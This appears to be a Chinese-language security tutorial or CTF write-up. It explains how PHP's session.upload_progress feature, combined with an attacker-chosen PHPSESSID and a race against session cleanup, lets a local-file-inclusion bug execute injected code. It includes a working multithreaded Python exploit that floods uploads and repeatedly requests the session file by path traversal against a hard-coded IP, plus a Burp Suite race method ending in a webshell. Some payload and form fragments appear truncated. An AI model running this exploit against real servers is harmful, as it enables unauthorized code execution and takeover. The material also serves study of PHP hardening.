索引是session.upload_progress.prefix与session.upload_progress.name连接在一起的值。
`session.upload_progress.freq = "1%"`+`session.upload_progress.min_freq =
"1"`：选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。
`session.upload_progress`：php>=5.4添加的。最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中（包含用户可控的值），即使此时用户没有初始化Session，PHP也会自动初始化Session。
而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启。那么，如何利用这个特性呢？
**查看官方给的案列**
PHP_SESSION_UPLOAD_PROGRESS的官方手册
    http://php.net/manual/zh/session.upload-progress.php
一个上传进度数组的结构的例子
     " value="123" />
在session中存放的数据看上去是这样子的：
     1234567890,   // The request time
     "content_length" => 57343257, // POST content length
     "bytes_processed" => 453489,  // Amount of bytes received and processed
     "done" => false,              // true when the POST handler has finished, successfully or not
     "files" => array(
      0 => array(
       "field_name" => "file1",       // Name of the  field
       // The following 3 elements equals those in $_FILES
       "name" => "foo.avi",
       "tmp_name" => "/tmp/phpxxxxxx",
       "error" => 0,
       "done" => true,                // True when the POST handler has finished handling this file
       "start_time" => 1234567890,    // When this file has started to be processed
       "bytes_processed" => 57343250, // Amount of bytes received and processed for this file
      ),
      // An other file, not finished uploading, in the same request
      1 => array(
       "field_name" => "file2",
       "name" => "bar.avi",
       "tmp_name" => NULL,
       "error" => 0,
       "done" => false,
       "start_time" => 1234567899,
       "bytes_processed" => 54554,
      ),
     )
    );
###  Bypass思路分析
从官方的案例和结果可以看到session中一部分数据(`session.upload_progress.name`)是用户自己可以控制的。那么我们只要上传文件的时候，在Cookie中设置`PHPSESSID=Qftm`（默认情况下session.use_strict_mode=0用户可以自定义Session
ID），同时POST一个恶意的字段`PHP_SESSION_UPLOAD_PROGRESS`
，（PHP_SESSION_UPLOAD_PROGRESS在session.upload_progress.name中定义），只要上传包里带上这个键，PHP就会自动启用Session，同时，我们在Cookie中设置了PHPSESSID=Qftm，所以Session文件将会自动创建。
事实上并不能完全的利用成功，因为`session.upload_progress.cleanup =
on`这个默认选项会有限制，当文件上传结束后，php将会立即清空对应session文件中的内容，这就导致我们在包含该session的时候相当于在包含一个空文件，没有包含我们传入的恶意代码。不过，我们只需要条件竞争，赶在文件被清除前利用即可。
###  Bypass思路梳理
  * upload file
    files={'file': ('a.txt', "xxxxxxx")}
  * 设置cookie PHPSESSID
    session.use_strict_mode=0造成Session ID可控
    PHPSESSID=Qftm
  * POST一个字段PHP_SESSION_UPLOAD_PROGRESS
    session.upload_progress.name="PHP_SESSION_UPLOAD_PROGRESS"，在session中可控，同时，触发系统初始化session
    "PHP_SESSION_UPLOAD_PROGRESS":''
  * session.upload_progress.cleanup = on
    多线程，时间竞争
###  Bypass攻击利用
**脚本利用攻击**
  * **编写Exp**
    import io
    import sys
    import requests
    import threading
    sessid = 'Qftm'
    def POST(session):
        while True:
            f = io.BytesIO(b'a' * 1024 * 50)
            session.post(
                'http://192.33.6.145/index.php',
                data={"PHP_SESSION_UPLOAD_PROGRESS":"');?>"},
                files={"file":('q.txt', f)},
                cookies={'PHPSESSID':sessid}
            )
    def READ(session):
        while True:
            response = session.get(f'http://192.33.6.145/index.php?file=../../../../../../../../var/lib/php/sessions/sess_{sessid}')
            # print('[+++]retry')
            # print(response.text)
            if 'flag' not in response.text:
                print('[+++]retry')
            else:
                print(response.text)
                sys.exit(0)
    with requests.session() as session:
        t1 = threading.Thread(target=POST, args=(session, ))
        t1.daemon = True
        t1.start()
        READ(session)
  * **运行攻击效果**
在服务器中可以看到生成：sess_Qftm
同时恶意代码也会正常执行
之后可以利用后门webshell进行连接Getshell
**表单利用攻击**
上面的一种做法是通过编写脚本代码的方式去利用的，不过还有另一种利用手段就是表单的攻击利用。
  * **表单构造**
这里可以更改官方给的案例进行利用
`upload.html`
        " />
但是同样需要注意的是，cleanup是on，所以需要条件竞争，使用BP抓包，一遍疯狂发包，一遍疯狂请求。
  * **上传文件**
访问本地upload.html开启代理开始上传文件
  * **发包传入恶意会话**
代理拦截我们的上传请求数据包，这里需要设置`Cookie:
PHPSESSID=123456789`（自定义sessionID），然后不断发包，生成session，传入恶意会话。
请求载荷设置`Null payloads`
不断发包维持恶意session的存储
不断发包的情况下，在服务器上可以看到传入的恶意session
  * **发包请求恶意会话**
不断发出请求包含恶意的session
请求载荷设置`Null payloads`
在一端不断发包维持恶意session存储的时候，另一端不断发包请求包含恶意的session
从结果中可以看到，利用表单攻击的这种手法也是可以的，可以看到恶意代码包含执行成功。
## Conclusion
在平时遇到限制的时候，多去以逆向的思维和系统服务或代码的本身去考虑问题，这样才很有可能突破固有的限制。